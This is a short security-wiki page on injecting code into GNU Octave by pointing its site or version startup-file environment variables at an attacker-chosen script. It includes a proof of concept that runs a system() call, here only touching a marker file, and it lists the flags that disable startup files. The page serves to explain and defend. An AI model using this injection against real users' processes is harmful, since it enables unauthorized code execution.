---
title: "macOS GNU Octave Applications Injection"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-octave-applications-injection.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

`OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`
GNU Octave executes several files containing valid Octave commands during startup. `OCTAVE_SITE_INITFILE` overrides the site-wide startup file and `OCTAVE_VERSION_INITFILE` overrides the version-specific one, allowing either variable to redirect automatic execution to an attacker-readable file.[\[1\]](#references)

```
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE
OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` only skips user files such as `~/.octaverc`; it does **not** stop the site-file override above. Use `--no-site-file` for the site files or `--norc` / `-f` to disable all startup files.[\[2\]](#references)

## References
